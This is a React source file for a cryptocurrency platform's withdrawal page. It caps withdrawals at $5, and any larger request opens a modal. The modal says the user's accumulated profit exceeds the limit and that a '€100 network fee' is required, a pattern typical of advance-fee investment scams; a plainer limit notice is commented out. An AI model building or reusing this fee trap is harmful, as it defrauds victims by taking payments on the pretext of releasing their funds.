import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion, AnimatePresence } from 'framer-motion';
import { FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaTimes } from 'react-icons/fa';
import toast from 'react-hot-toast';
import Navbar from '../components/Navbar';
import { walletService } from '../services/walletService';
import { useAuth } from '../auth/userAuth';

// Withdrawal limit for standard users
const MAX_WITHDRAWAL_LIMIT = 5;

const Withdraw = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [amount, setAmount] = useState('');
  const [crypto, setCrypto] = useState('USDT');
  const [address, setAddress] = useState('');
  const [loading, setLoading] = useState(false);
  const [walletBalance, setWalletBalance] = useState(0);
  const [showLimitModal, setShowLimitModal] = useState(false);

  useEffect(() => {
    const fetchData = async () => {
      try {
        const wallet = await walletService.getWallet();
        setWalletBalance(wallet.balance || 0);
      } catch (error) {
        console.error('Failed to fetch wallet:', error);
      }
    };
    fetchData();
  }, []);

  const cryptos = [
    { id: 'USDT', name: 'Tether', icon: FaBitcoin, color: 'text-green-500' },
    { id: 'BTC', name: 'Bitcoin', icon: FaBitcoin, color: 'text-orange-500' },
    { id: 'ETH', name: 'Ethereum', icon: FaEthereum, color: 'text-purple-500' },
    { id: 'BNB', name: 'BNB', icon: FaBitcoin, color: 'text-yellow-500' },
    { id: 'TRX', name: 'Tron', icon: FaBitcoin, color: 'text-red-500' },
  ];

  const handleSubmit = (e) => {
    e.preventDefault();

    const amountNum = parseFloat(amount);

    // Check if amount is valid
    if (!amount || amountNum < 1) {
      toast.error('Please enter a valid amount');
      return;
    }

    // Check withdrawal limit - show popup instead of toast
    if (amountNum > MAX_WITHDRAWAL_LIMIT) {
      setShowLimitModal(true);
      return;
    }

    if (amountNum > walletBalance) {
      toast.error('Insufficient balance');
      return;
    }

    if (!address) {
      toast.error('Please enter a wallet address');
      return;
    }

    // Proceed with withdrawal
    proceedWithdrawal(amountNum);
  };

  const proceedWithdrawal = async (amountNum) => {
    setLoading(true);
    try {
      await walletService.requestWithdrawal({
        amount: amountNum,
        cryptoCurrency: crypto,
        walletAddress: address,
      });
      toast.success('Withdrawal request submitted!');
      navigate('/transactions');
    } catch (error) {
      toast.error(error.response?.data?.message || 'Withdrawal failed');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 pt-16 lg:pl-64 pb-20 lg:pb-0">
      <Navbar />
      <div className="p-4 sm:p-6 max-w-2xl mx-auto">
        <div className="mb-6">
          <h1 className="text-2xl sm:text-3xl font-bold text-white">Withdraw Funds</h1>
          <p className="text-slate-400 mt-1">Withdraw your earnings</p>
        </div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-slate-800/50 backdrop-blur-xl rounded-2xl p-6 border border-slate-700"
        >
          <div className="bg-slate-900 rounded-lg p-4 mb-6">
            <div className="flex justify-between items-center">
              <span className="text-slate-400">Available Balance</span>
              <span className="text-xl font-bold text-white">${walletBalance.toFixed(2)}</span>
            </div>
          </div>

          {/* Withdrawal Limit Notice */}
          {/* <div className="mb-6 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
            <FaLock className="text-yellow-500 text-sm mt-0.5" />
            <div>
              <p className="text-yellow-500 text-sm font-medium">Withdrawal Limit: ${MAX_WITHDRAWAL_LIMIT}</p>
              <p className="text-xs text-yellow-400/70">
                Your current withdrawal limit is ${MAX_WITHDRAWAL_LIMIT}. Upgrade your account to withdraw more.
              </p>
            </div>
          </div> */}

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Select Cryptocurrency</label>
              <div className="grid grid-cols-3 sm:grid-cols-5 gap-2">
                {cryptos.map((c) => (
                  <button
                    key={c.id}
                    type="button"
                    onClick={() => setCrypto(c.id)}
                    className={`p-3 rounded-lg border transition ${crypto === c.id ? 'border-blue-500 bg-blue-500/10' : 'border-slate-700 hover:border-slate-500'}`}
                  >
                    <c.icon className={`w-6 h-6 mx-auto ${c.color}`} />
                    <span className="text-xs text-slate-400 mt-1 block">{c.id}</span>
                  </button>
                ))}
              </div>
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Amount (USD)</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">$</span>
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="Enter amount"
                  min="1"
                  step="0.01"
                  className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
                />
              </div>
              <p className="text-xs text-slate-400 mt-1">Maximum withdrawal: ${MAX_WITHDRAWAL_LIMIT}</p>
            </div>

            <div>
              <label className="block text-slate-300 text-sm font-medium mb-2">Wallet Address</label>
              <input
                type="text"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                placeholder="Enter your wallet address"
                className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
              />
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full py-3 rounded-lg bg-gradient-to-r from-orange-600 to-red-600 text-white font-semibold hover:opacity-90 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
              ) : (
                <>
                  <FaArrowDown className="text-sm" /> Request Withdrawal
                </>
              )}
            </button>
          </form>
        </motion.div>
      </div>

      {/* Limit Exceeded Modal - Updated Message */}
      <AnimatePresence>
        {showLimitModal && (
          <div
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm"
            onClick={() => setShowLimitModal(false)}
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              exit={{ opacity: 0, scale: 0.9 }}
              className="bg-slate-800 rounded-2xl max-w-md w-full border border-slate-700 shadow-2xl overflow-hidden"
              onClick={(e) => e.stopPropagation()}
            >
              {/* Header */}
              <div className="flex justify-between items-center px-6 py-4 bg-gradient-to-r from-red-600/20 to-orange-600/20 border-b border-slate-700">
                <div className="flex items-center gap-3">
                  <FaLock className="text-red-500 text-xl" />
                  <h2 className="text-xl font-bold text-white">Withdrawal Restricted</h2>
                </div>
                <button
                  onClick={() => setShowLimitModal(false)}
                  className="p-2 hover:bg-slate-700 rounded-lg transition"
                >
                  <FaTimes className="text-slate-400" />
                </button>
              </div>

              {/* Body */}
              <div className="p-6 space-y-4">
                <div className="flex items-start gap-3 p-3 bg-red-500/10 border border-red-500/20 rounded-lg">
                  <FaLock className="text-red-500 text-lg mt-0.5 flex-shrink-0" />
                  <p className="text-slate-200 text-sm leading-relaxed">
                    Withdrawal Restricted. Your accumulated profit has exceeded the withdrawal limit. A <span className="text-yellow-400 font-bold">€100 network fee</span> is required to complete the transfer.
                  </p>
                </div>

                <div className="mt-2 p-3 bg-slate-700/30 rounded-lg border border-slate-600">
                  <p className="text-slate-400 text-xs text-center">
                    💡 The network fee is a one-time payment to process your withdrawal.
                  </p>
                </div>
              </div>

              {/* Footer */}
              <div className="px-6 py-4 border-t border-slate-700 flex flex-col gap-3">
                <button
                  onClick={() => setShowLimitModal(false)}
                  className="w-full py-2 bg-gradient-to-r from-red-600 to-orange-600 text-white rounded-lg hover:opacity-90 transition"
                >
                  I Understand
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default Withdraw;